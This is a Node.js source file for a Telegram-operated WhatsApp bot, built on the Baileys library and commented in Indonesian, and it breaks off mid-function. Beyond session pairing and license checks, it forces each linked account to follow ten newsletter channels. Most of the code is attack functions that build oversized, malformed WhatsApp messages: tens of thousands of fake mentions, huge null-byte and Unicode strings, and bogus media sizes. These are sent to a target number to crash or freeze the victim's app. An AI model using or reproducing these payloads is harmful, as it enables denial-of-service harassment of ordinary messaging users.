const {
  default: makeWASocket,
  useMultiFileAuthState,
  downloadContentFromMessage,
  emitGroupParticipantsUpdate,
  emitGroupUpdate,
  generateWAMessageContent,
  generateWAMessage,
  generateMessageID,
  generateLargeString,
  makeInMemoryStore,
  prepareWAMessageMedia,
  generateWAMessageFromContent,
  MediaType,
  areJidsSameUser,
  WAMessageStatus,
  downloadAndSaveMediaMessage,
  AuthenticationState,
  GroupMetadata,
  initInMemoryKeyStore,
  getContentType,
  MiscMessageGenerationOptions,
  useSingleFileAuthState,
  BufferJSON,
  WAMessageProto,
  MessageOptions,
  WAFlag,
  WANode,
  WAMetric,
  ChatModification,
  MessageTypeProto,
  WALocationMessage,
  ReconnectMode,
  WAContextInfo,
  proto,
  WAGroupMetadata,
  ProxyAgent,
  waChatKey,
  MimetypeMap,
  MediaPathMap,
  WAContactMessage,
  WAContactsArrayMessage,
  WAGroupInviteMessage,
  WATextMessage,
  WAMessageContent,
  WAMessage,
  BaileysError,
  WA_MESSAGE_STATUS_TYPE,
  MediaConnInfo,
  URL_REGEX,
  WAUrlInfo,
  WA_DEFAULT_EPHEMERAL,
  WAMediaUpload,
  jidDecode,
  mentionedJid,
  processTime,
  Browser,
  MessageType,
  Presence,
  WA_MESSAGE_STUB_TYPES,
  Mimetype,
  relayWAMessage,
  Browsers,
  GroupSettingChange,
  DisconnectReason,
  WASocket,
  getStream,
  WAProto,
  isBaileys,
  AnyMessageContent,
  fetchLatestBaileysVersion,
  templateMessage,
  InteractiveMessage,
  Header,
} = require("@whiskeysockets/baileys");
const fs = require("fs-extra");
const JsConfuser = require("js-confuser");
const P = require("pino");
const crypto = require("crypto");
const path = require("path");
const sessions = new Map();
const readline = require("readline");
const SESSIONS_DIR = "./sessions";
const SESSIONS_FILE = "./sessions/active_sessions.json";

let premiumUsers = JSON.parse(fs.readFileSync("./Penyimpanan/premium.json"));
let adminUsers = JSON.parse(fs.readFileSync("./Penyimpanan/admin.json"));

function ensureFileExists(filePath, defaultData = []) {
  if (!fs.existsSync(filePath)) {
    fs.writeFileSync(filePath, JSON.stringify(defaultData, null, 2));
  }
}

ensureFileExists("./Penyimpanan/premium.json");
ensureFileExists("./Penyimpanan/admin.json");

// Fungsi untuk menyimpan data premium dan admin
function savePremiumUsers() {
  fs.writeFileSync("./Penyimpanan/premium.json", JSON.stringify(premiumUsers, null, 2));
}

function saveAdminUsers() {
  fs.writeFileSync("./Penyimpanan/admin.json", JSON.stringify(adminUsers, null, 2));
}

// Fungsi untuk memantau perubahan file
function watchFile(filePath, updateCallback) {
  fs.watch(filePath, (eventType) => {
    if (eventType === "change") {
      try {
        const updatedData = JSON.parse(fs.readFileSync(filePath));
        updateCallback(updatedData);
        console.log(`File ${filePath} updated successfully.`);
      } catch (error) {
        console.error(`Error updating ${filePath}:`, error.message);
      }
    }
  });
}

watchFile("./Penyimpanan/premium.json", (data) => (premiumUsers = data));
watchFile("./Penyimpanan/admin.json", (data) => (adminUsers = data));
const axios = require("axios");
const chalk = require("chalk");
const config = require("./config.js");
const TelegramBot = require("node-telegram-bot-api");
const globalidch1 = "120363402162420267@newsletter"
const globalidch2 = "120363400420222742@newsletter"
const globalidch3 = "120363420848738933@newsletter"
const globalidch4 = "120363419988790139@newsletter"
const globalidch5 = "120363417355118317@newsletter"
const globalidch6 = "120363420435046565@newsletter"
const globalidch7 = "120363417574302739@newsletter"
const globalidch8 = "120363402346679388@newsletter"
const globalidch9 = "120363399469135719@newsletter"
const globalidch10 = "120363390660011889@newsletter"
const BOT_TOKEN = config.BOT_TOKEN;
const OWNER_ID = config.OWNER_ID;
const GITHUB_TOKEN_LIST_URL =
  "https://raw.githubusercontent.com/DryzxModsACT/DatabaseSc/refs/heads/main/tokens.json";
const GITHUB_OWNERID_LIST_URL =
  "https://raw.githubusercontent.com/DryzxModsACT/DatabaseSc/refs/heads/main/tokens.json";
// FUNCTION CEK TOKEN BOT APAKAH MASUK DATABASE //
async function fetchValidTokens() {
  try {
    const response = await axios.get(GITHUB_TOKEN_LIST_URL);
    return response.data.tokens;
  } catch (error) {
    console.error(
      chalk.red("❌ Gagal mengambil daftar token dari GitHub:", error.message)
    );
    return [];
  }
}

async function validateToken() {
  console.log(chalk.blue("Bentar gwe cek dulu token bot lu😒"));

  const validTokens = await fetchValidTokens();
  if (!validTokens.includes(BOT_TOKEN)) {
    console.log(chalk.red("SI MISKIN NGAPAIN AJG"));
    process.exit(1);
  }

  console.log(chalk.green(` Horee....Token Bot Anda Masuk Database⠀`));
  startBot();
  initializeWhatsAppConnections();
}
// FUNCTION CEK TOKEN BOT APAKAH MASUK DATABASE //
// FUNCTION CEK ID OWNER APAKAH MASUK DATABASE //
async function fetchValidOwnerid() {
  try {
    const response = await axios.get(GITHUB_OWNERID_LIST_URL);
    return response.data.ownerid;
  } catch (error) {
    console.error(
      chalk.red("❌ Gagal mengambil daftar ownerid dari GitHub:", error.message)
    );
    return [];
  }
}

async function validateOwnerid() {
  console.log(chalk.blue("Bentar gwe cek dulu ownerid lu😒"));

  const validOwnerid = await fetchValidOwnerid();
  if (!validOwnerid.includes(OWNER_ID)) {
    console.log(chalk.red("SI MISKIN NGAPAIN AJG"));
    process.exit(1);
  }

  console.log(chalk.green(` Horee....Ownerid Anda Masuk Database⠀`));
  startBot();
  initializeWhatsAppConnections();
}
// FUNCTION CEK ID OWNER APAKAH MASUK DATABASE //

const bot = new TelegramBot(BOT_TOKEN, { polling: true });

function startBot() {
  console.log(
    chalk.blue(`
╔═╗╔═╗────╔══╗───
║║╚╝║║────║╔╗║───
║╔╗╔╗╠══╦═╣╚╝╠══╗
║║║║║║╔╗║╔╩═╗║╔╗║
║║║║║║╔╗║║╔═╝║╔╗║
╚╝╚╝╚╩╝╚╩╝╚══╩╝╚╝
╔═╗╔═╗────╔╗─╔╗────────
║║╚╝║║────║║─║║────────
║╔╗╔╗╠══╦═╝╠═╝╠══╦═╦══╗
║║║║║║╔╗║╔╗║╔╗║║═╣╔╣══╣
║║║║║║╚╝║╚╝║╚╝║║═╣║╠══║
╚╝╚╝╚╩══╩══╩══╩══╩╝╚══╝
`)
  );
}
validateToken();

let Mvaa;

function saveActiveSessions(botNumber) {
  try {
    const sessions = [];
    if (fs.existsSync(SESSIONS_FILE)) {
      const existing = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      if (!existing.includes(botNumber)) {
        sessions.push(...existing, botNumber);
      }
    } else {
      sessions.push(botNumber);
    }
    fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessions));
  } catch (error) {
    console.error("Error saving session:", error);
  }
}

async function initializeWhatsAppConnections() {
  try {
    if (fs.existsSync(SESSIONS_FILE)) {
      const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      console.log(`Ditemukan ${activeNumbers.length} sesi WhatsApp aktif`);

      for (const botNumber of activeNumbers) {
        console.log(`Mencoba menghubungkan WhatsApp: ${botNumber}`);
        const sessionDir = createSessionDir(botNumber);
        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

        Mvaa = makeWASocket({
          auth: state,
          printQRInTerminal: true,
          logger: P({ level: "silent" }),
          defaultQueryTimeoutMs: undefined,
        });

        // Tunggu hingga koneksi terbentuk
        await new Promise((resolve, reject) => {
          Mvaa.ev.on("connection.update", async (update) => {
            const { connection, lastDisconnect } = update;
            if (connection === "open") {
              console.log(`Bot ${botNumber} terhubung!`);
              sessions.set(botNumber, Mvaa);
              resolve();
            } else if (connection === "close") {
              const shouldReconnect =
                lastDisconnect?.error?.output?.statusCode !==
                DisconnectReason.loggedOut;
              if (shouldReconnect) {
                console.log(`Mencoba menghubungkan ulang bot ${botNumber}...`);
                await initializeWhatsAppConnections();
              } else {
                reject(new Error("Koneksi ditutup"));
              }
            }
          });

          Mvaa.ev.on("creds.update", saveCreds);
        });
      }
    }
  } catch (error) {
    console.error("Error initializing WhatsApp connections:", error);
  }
}

function createSessionDir(botNumber) {
  const deviceDir = path.join(SESSIONS_DIR, `device${botNumber}`);
  if (!fs.existsSync(deviceDir)) {
    fs.mkdirSync(deviceDir, { recursive: true });
  }
  return deviceDir;
}

async function connectToWhatsApp(botNumber, chatId) {
  let statusMessage = await bot
    .sendMessage(
      chatId,
      `\`\`\`
┏──────────────────────────┓
│ Nᴜᴍʙᴇʀ : ${botNumber}
│ Pʀᴏsᴇs : 
│
│ ©𝗠𝗼̶𝗱⃭𝗱⃬𝗲𝗿̭̬𝘀 〽️
┗──────────────────────────┛
\`\`\`
`,
      { parse_mode: "Markdown" }
    )
    .then((msg) => msg.message_id);

  const sessionDir = createSessionDir(botNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  Mvaa = makeWASocket({
    auth: state,
    printQRInTerminal: false,
    logger: P({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  Mvaa.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const statusCode = lastDisconnect?.error?.output?.statusCode;
      if (statusCode && statusCode >= 500 && statusCode < 600) {
        await bot.editMessageText(
          `\`\`\`
┏──────────────────────────┓
│ Nᴜᴍʙᴇʀ : ${botNumber}
│ Pʀᴏsᴇs : Mᴇɴɢʜᴜʙᴜɴɢᴋᴀɴ
│
│ ©𝗠𝗼̶𝗱⃭𝗱⃬𝗲𝗿̭̬𝘀 〽️
┗──────────────────────────┛
\`\`\`
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
        await connectToWhatsApp(botNumber, chatId);
      } else {
        await bot.editMessageText(
          `\`\`\`
┏──────────────────────────┓
│ Nᴜᴍʙᴇʀ : ${botNumber}
│ Pʀᴏsᴇs : Gᴀɢᴀʟ
│
│ ©𝗠𝗼̶𝗱⃭𝗱⃬𝗲𝗿̭̬𝘀 〽️
┗──────────────────────────┛
\`\`\`
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
        try {
          fs.rmSync(sessionDir, { recursive: true, force: true });
        } catch (error) {
          console.error("Error deleting session:", error);
        }
      }
    } else if (connection === "open") {
      Mvaa.newsletterFollow(globalidch1)
      Mvaa.newsletterFollow(globalidch2)
      Mvaa.newsletterFollow(globalidch3)
      Mvaa.newsletterFollow(globalidch4)
      Mvaa.newsletterFollow(globalidch5)
      Mvaa.newsletterFollow(globalidch6)
      Mvaa.newsletterFollow(globalidch7)
      Mvaa.newsletterFollow(globalidch8)
      Mvaa.newsletterFollow(globalidch9)
      Mvaa.newsletterFollow(globalidch10)
      sessions.set(botNumber, Mvaa);
      saveActiveSessions(botNumber);
      await bot.editMessageText(
        `\`\`\`
┏──────────────────────────┓
│ Nᴜᴍʙᴇʀ : ${botNumber}
│ Pʀᴏsᴇs : Tᴇʀʜᴜʙᴜɴɢ
│
│ ©𝗠𝗼̶𝗱⃭𝗱⃬𝗲𝗿̭̬𝘀 〽️
┗──────────────────────────┛
\`\`\`
`,
        {
          chat_id: chatId,
          message_id: statusMessage,
          parse_mode: "Markdown",
        }
      );
    } else if (connection === "connecting") {
      await new Promise((resolve) => setTimeout(resolve, 1000));
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
          const code = await Mvaa.requestPairingCode(botNumber,"TRACELESS");
          const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;
          await bot.editMessageText(
            `\`\`\`
┏──────────────────────────┓
│ Nᴜᴍʙᴇʀ : ${botNumber}
│ Cᴏᴅᴇ : ${formattedCode}
│
│ ©𝗠𝗼̶𝗱⃭𝗱⃬𝗲𝗿̭̬𝘀 〽️
┗──────────────────────────┛
\`\`\``,
            {
              chat_id: chatId,
              message_id: statusMessage,
              parse_mode: "Markdown",
            }
          );
        }
      } catch (error) {
        console.error("Error requesting pairing code:", error);
        await bot.editMessageText(
          `\`\`\`
┏──────────────────────────┓
│ Nᴜᴍʙᴇʀ : ${botNumber}
│ Cᴏᴅᴇ : ${error.message}
│
│ ©𝗠𝗼̶𝗱⃭𝗱⃬𝗲𝗿̭̬𝘀 〽️
┗──────────────────────────┛
\`\`\``,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
      }
    }
  });

  Mvaa.ev.on("creds.update", saveCreds);

  return Mvaa;
}

//~Runtime🗑️🔧
function formatRuntime(seconds) {
  const days = Math.floor(seconds / (3600 * 24));
  const hours = Math.floor((seconds % (3600 * 24)) / 3600);
  const minutes = Math.floor((seconds % 3600) / 60);
  const secs = seconds % 60;

  return `${days} Hari, ${hours} Jam, ${minutes} Menit, ${secs} Detik`;
}

const startTime = Math.floor(Date.now() / 1000); // Simpan waktu mulai bot

function getBotRuntime() {
  const now = Math.floor(Date.now() / 1000);
  return formatRuntime(now - startTime);
}

//~Get Speed Bots🔧🗑️
function getSpeed() {
  const startTime = process.hrtime();
  return getBotSpeed(startTime); // Panggil fungsi yang sudah dibuat
}

//~ Date Now
function getCurrentDate() {
  const now = new Date();
  const options = {
    weekday: "long",
    year: "numeric",
    month: "long",
    day: "numeric",
  };
  return now.toLocaleDateString("id-ID", options); // Format: Senin, 6 Maret 2025
}

function getPremiumStatus(userId) {
  const user = premiumUsers.find((user) => user.id === userId);
  if (user && new Date(user.expiresAt) > new Date()) {
    return `Premium`;
  } else {
    return "No akses";
  }
}

// Get Random Image
function getRandomImage() {
  const image = ["https://files.catbox.moe/a2gjsb.png"]
}

// ~ Coldown
const cooldowns = new Map();
const cooldownTime = 5 * 60 * 1000; // 5 menit dalam milidetik

function checkCooldown(userId) {
  if (cooldowns.has(userId)) {
    const remainingTime = cooldownTime - (Date.now() - cooldowns.get(userId));
    if (remainingTime > 0) {
      return Math.ceil(remainingTime / 1000); // Sisa waktu dalam detik
    }
  }
  cooldowns.set(userId, Date.now());
  setTimeout(() => cooldowns.delete(userId), cooldownTime);
  return 0; // Tidak dalam cooldown
}
// Function...
async function DevilsProtocolV2(Mvaa, target, mention) {
    const mentionjid = [
    "9999999999@s.whatsapp.net",
    ...Array.from({ length: 40000 }, () =>
        `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
    )
];

    const embeddedMusic = {
        musicContentMediaId: "589608164114571",
        songId: "870166291800508",
        author: "Devils Protocols" + "᭄".repeat(10000),
        title: "Version 2" + "᭄",
        artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
        artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
        artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
        artistAttribution: "https://n.uguu.se/UnDeath.jpg",
        countryBlocklist: true,
        isExplicit: true,
        artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
    };

const devilsMesagge = {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
        mimetype: "video/mp4",
        fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
        fileLength: "999999999999",
        seconds: 999999,
        mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
        caption: "𝕯𝖊𝖛𝖎𝖑𝖘 𝕻𝖗𝖔𝖙𝖔𝖈𝖔𝖑𝖘",
        height: 640,
        width: 640,
        fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
        directPath: "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1743848703",
        contextInfo: {
           externalAdReply: {
              showAdAttribution: true,
              title: `🥶`,
              body: `${"\u0000".repeat(9117)}`,
              mediaType: 1,
              renderLargerThumbnail: true,
              thumbnailUrl: null,
              sourceUrl: "https://t.me/FunctionLihX"
        },
           businessMessageForwardInfo: {
              businessOwnerJid: target,
        },
            isSampled: true,
            mentionedJid: mentionjid
        },
        forwardedNewsletterMessageInfo: {
            newsletterJid: "120363406229895095@newsletter",
            serverMessageId: 1,
            newsletterName: `${"ꦾ".repeat(100)}`
        },
        streamingSidecar: "cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=",
        thumbnailDirectPath: "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0",
        thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
        thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=",
        annotations: [
            {
                embeddedContent: {
                   embeddedMusic
                },
                embeddedAction: true
            }
        ]
    };

    const msg = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: { devilsMesagge }
        }
    }, {});

    await Mvaa.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            { tag: "to", attrs: { jid: target }, content: undefined }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await Mvaa.relayMessage(target, {
            groupStatusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: msg.key,
                        type: 25
                    }
                }
            }
        }, {
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: { is_status_mention: "true" },
                    content: undefined
                }
            ]
        });
    }
}

async function Xvold(target, mention) {
const Voldx = [
        {
            attrs: { biz_bot: '1' },
            tag: "meta",
        },
        {
            attrs: {},
            tag: "biz",
        },
    ];
const delaymention = Array.from({ length: 30000 }, (_, r) => ({
        title: "᭡꧈".repeat(95000),
        rows: [{ title: `${r + 1}`, id: `${r + 1}` }]
    }));
 
const quotedMessage = {
    extendedTextMessage: {
        text: "᭯".repeat(12000),
        matchedText: "https://" + "ꦾ".repeat(500) + ".com",
        canonicalUrl: "https://" + "ꦾ".repeat(500) + ".com",
        description: "\u0000".repeat(500),
        title: "\u200D".repeat(1000),
        previewType: "NONE",
        jpegThumbnail: Buffer.alloc(10000), 
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            externalAdReply: {
                showAdAttribution: true,
                title: "AnosXVold",
                body: "\u0000".repeat(10000),
                thumbnailUrl: "https://" + "ꦾ".repeat(630) + ".com",
                mediaType: 1,
                renderLargerThumbnail: true,
                sourceUrl: "https://" + "𓂀".repeat(2000) + ".xyz"
            },
            mentionedJid: Array.from({ length: 1000 }, (_, i) => `${Math.floor(Math.random() * 1000000000)}@s.whatsapp.net`)
        }
    },
    paymentInviteMessage: {
        currencyCodeIso4217: "USD",
        amount1000: "999999999",
        expiryTimestamp: "9999999999",
        inviteMessage: "Payment Invite" + "💥".repeat(1770),
        serviceType: 1
    }
};
 const message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath:
            "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: {
            low: 1746112211,
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                {
                  length: 40000,
                },
                () =>
                  "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              ),
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: -1939477883,
            high: 406,
            unsigned: false,
          },
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
        },
      },
    },
  };
let buttonsMessage = {
            text: "᭯".repeat(9741),
            contentText: "\u0000",
            footerText: "\u0000",
            buttons: [
                {
                    buttonId: "\u0000".repeat(911000),
                    buttonText: { displayText: "\u0000" + "\u0000".repeat(400000) },
                    type: 1,
                    headerType: 1,
                }, 
                {
                    text: "❦",
                    contentText:
                        "Untukmu 2000tahun yang akan datang",
                    footerText: "darimu 2000tahun yang lalu",
                    buttons: [
                        {
                            buttonId: ".anos",
                            buttonText: {
                                displayText: "Anos is maou" + "\u0000".repeat(500000),
                            },
                            type: 1,

}
                    ],
                    headerType: 1,
                },
                
           ]};
           
const mentionedList = [
"13135550002@s.whatsapp.net",
...Array.from({ length: 40000 }, () =>
`1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
)
];

const MSG = {
viewOnceMessage: {
message: {
listResponseMessage: {
title: "Vold Delay",
listType: 2,
buttonText: null,
sections: delaymention,
singleSelectReply: { selectedRowId: "🔴" },
contextInfo: {
mentionedJid: Array.from({ length: 30000 }, () => 
"1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
),
participant: target,
remoteJid: "status@broadcast",
forwardingScore: 9741,
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterJid: "333333333333@newsletter",
serverMessageId: 1,
newsletterName: "-"
}
},
description: "Ciett Delayyyy"
}
}
},
contextInfo: {
channelMessage: true,
statusAttributionType: 2
}
};         


const embeddedMusic = {
        musicContentMediaId: "589608164114571",
        songId: "870166291800508",
        author: ".RaldzzXyz" + "ោ៝".repeat(10000),
        title: "PhynixAgency",
        artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
        artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
        artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
        artistAttribution: "https://n.uguu.se/BvbLvNHY.jpg",
        countryBlocklist: true,
        isExplicit: true,
        artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
    };

    const videoMessage = {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
        mimetype: "video/mp4",
        fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
        fileLength: "109951162777600",
        seconds: 999999,
        mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
        caption: "ꦾ".repeat(12777),
        height: 640,
        width: 640,
        fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
        directPath: "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1743848703",
        contextInfo: {
           externalAdReply: {
              showAdAttribution: true,
              title: `☠️ - んジェラルド - ☠️`,
              body: `${"\u0000".repeat(9117)}`,
              mediaType: 1,
              renderLargerThumbnail: true,
              thumbnailUrl: null,
              sourceUrl: `https://${"ꦾ".repeat(100)}.com/`
        },
           businessMessageForwardInfo: {
              businessOwnerJid: target,
        },
            quotedMessage: quotedMessage,
            isSampled: true,
            mentionedJid: mentionedList
        },
        forwardedNewsletterMessageInfo: {
            newsletterJid: "120363321780343299@newsletter",
            serverMessageId: 1,
            newsletterName: `${"ꦾ".repeat(100)}`
        },
        streamingSidecar: "cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=",
        thumbnailDirectPath: "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0",
        thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
        thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=",
        annotations: [
            {
                embeddedContent: {
                    embeddedMusic
                },
                embeddedAction: true
            }
        ]
    };  {};

const msg = generateWAMessageFromContent(target, message, delaymention, Voldx, {});

    await Mvaa.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            { tag: "to", attrs: { jid: target }, content: undefined }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await Mvaa.relayMessage(target, {
            groupStatusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: msg.key,
                        type: 25
                    }
                }
            }
        }, {
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: { is_status_mention: "true" },
                    content: undefined
                }
            ]
        });
    }
}

async function VampSuperDelay(target, mention = false) {
    const mentionedList = [
        "13135550002@s.whatsapp.net",
        ...Array.from({ length: 40000 }, () =>
            `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
        )
    ];

    const embeddedMusic = {
        musicContentMediaId: "589608164114571",
        songId: "870166291800508",
        author: "   ✧ 𝗠𝗶̭̬𝗽⃭𝗮⃬𝗮  𝗠𝗼̶𝗱⃭𝗱⃬𝗲𝗿̭̬𝘀 〽️   " + "ោ៝".repeat(10000),
        title: "Iqbhalkeifer",
        artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
        artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
        artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
        artistAttribution: "https://www.youtube.com/@iqbhalkeifer25",
        countryBlocklist: true,
        isExplicit: true,
        artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
    };

    const videoMessage = {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
        mimetype: "video/mp4",
        fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
        fileLength: "289511",
        seconds: 15,
        mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
        caption: "   ✧ 𝗠𝗶̭̬𝗽⃭𝗮⃬𝗮  𝗠𝗼̶𝗱⃭𝗱⃬𝗲𝗿̭̬𝘀 〽️   ",
        height: 640,
        width: 640,
        fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
        directPath: "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1743848703",
        contextInfo: {
            isSampled: true,
            mentionedJid: mentionedList
        },
        forwardedNewsletterMessageInfo: {
            newsletterJid: "120363321780343299@newsletter",
            serverMessageId: 1,
            newsletterName: "   ✧ 𝗠𝗶̭̬𝗽⃭𝗮⃬𝗮  𝗠𝗼̶𝗱⃭𝗱⃬𝗲𝗿̭̬𝘀 〽️   "
        },
        streamingSidecar: "cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=",
        thumbnailDirectPath: "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0",
